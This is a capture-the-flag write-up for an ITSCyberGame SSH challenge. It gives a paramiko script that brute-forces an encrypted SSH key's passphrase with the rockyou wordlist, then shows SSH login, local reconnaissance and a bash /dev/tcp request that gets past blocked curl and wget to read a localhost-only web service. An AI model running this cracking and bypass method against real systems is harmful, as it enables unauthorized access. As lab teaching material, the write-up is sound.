# Internal Service

**Competition:** ITSCyberGame<br>
**Category:** SSH<br>
**Service:** `sfide.itscybergame.it:<port_number>`<br>
**Credentials:** `ctfplayer` + private key `ctf_id_rsa`

---

## Description
> Hi! I want to access this VM of a competitor I found in the cloud, but the private key is passphrase-protected... Can you get in and tell me what you find inside?
> User: `ctfplayer`

A passphrase-protected SSH private key is provided to access a virtual machine. Inside there is an internal web service not reachable from the outside. The goal is to retrieve the flag.

---

## Solution

### 1. Private key analysis

```bash
file ctf_id_rsa
# ctf_id_rsa: OpenSSH private key
```

The key is protected by a passphrase. Inspecting the format:

```python
import base64, struct

data = open('ctf_id_rsa').read()
raw = base64.b64decode(''.join(data.strip().split('\n')[1:-1]))
# Cipher: aes256-ctr
# KDF: bcrypt
# Rounds: 24
```

Encrypted with `aes256-ctr`, KDF `bcrypt` with **24 rounds** → slow to crack on CPU (~4–5 hashes/s).

---

### 2. Passphrase crack — Paramiko brute force

`john` doesn't support the `$sshng$6$` format. An alternative is to brute-force directly with **paramiko**, attempting to load the private key with each candidate password.

```python
import paramiko, io, time

key_data = open('ctf_id_rsa', 'r').read()

def try_pass(pwd):
    try:
        paramiko.RSAKey.from_private_key(io.StringIO(key_data), password=pwd)
        return True
    except:
        return False

start = time.time()
count = 0
with open('rockyou.txt', 'r', encoding='latin-1', errors='ignore') as f:
    for line in f:
        pwd = line.strip()
        count += 1
        if try_pass(pwd):
            print(f"[FOUND] Passphrase: {pwd} (after {count} attempts, {time.time()-start:.1f}s)")
            break
        if count % 100 == 0:
            print(f"  {count} tried | {count/(time.time()-start):.1f}/s | last: {pwd}", end='\r')
```

**Result:** passphrase = `banana` (245 attempts, ~55s)

---

### 3. SSH access

```bash
chmod 600 ctf_id_rsa
ssh -i ctf_id_rsa -p <port_number> ctfplayer@sfide.itscybergame.it
# Enter passphrase: banana
```

Shell obtained as `ctfplayer` (uid=1001).

---

### 4. Internal reconnaissance

```bash
ls /opt
# secret_web

ls -la /opt/
# drwx------ 1 webdaemon webdaemon 4096 Mar 25 18:25 secret_web
# Permission denied for ctfplayer

ss -tlnp
# LISTEN  0  5  127.0.0.1:3000  0.0.0.0:*

ps -ef
# webdaemon  9  1  bash -c cd /opt/secret_web && python3 -m http.server 3000 --bind 127.0.0.1
# webdaemon  10 9  python3 -m http.server 3000 --bind 127.0.0.1
```

A `python3 -m http.server` service listens on `127.0.0.1:3000` (localhost-only), started by `webdaemon`. The directory `/opt/secret_web` is not readable by `ctfplayer`.

---

### 5. Accessing the internal service — bash `/dev/tcp`

`curl`, `wget` and `python3` are unavailable or blocked (`Permission denied`). Use the bash built-in `/dev/tcp`, which requires no external tools.

```bash
# GET /
exec 3<>/dev/tcp/127.0.0.1/3000
echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" >&3
cat <&3
exec 3>&-
```

**Response:**

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Content-type: text/html
Content-Length: 27

flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusions

| Step | Technique | Detail |
|------|-----------|--------|
| **1** | SSH key crack | Paramiko brute force on rockyou → `banana` (245 attempts) |
| **2** | SSH access | `ctfplayer` using decrypted key |
| **3** | Internal recon | `ss -tlnp` reveals `127.0.0.1:3000`; `ps -ef` shows `python3 -m http.server` |
| **4** | Tool bypass | curl/wget/python3 blocked → bash `/dev/tcp` raw socket |
| **5** | Flag exfil | `GET /` to the internal server returns the flag directly |

**Lessons learned:**

- `bcrypt` with high rounds makes SSH key cracking slow on CPU; use GPU (hashcat) or a smaller targeted wordlist.
- `python3 -m http.server` has no authentication: anyone who can reach the port can read the contents.
- When HTTP tools are blocked, bash `/dev/tcp` is a reliable fallback for raw TCP connections.
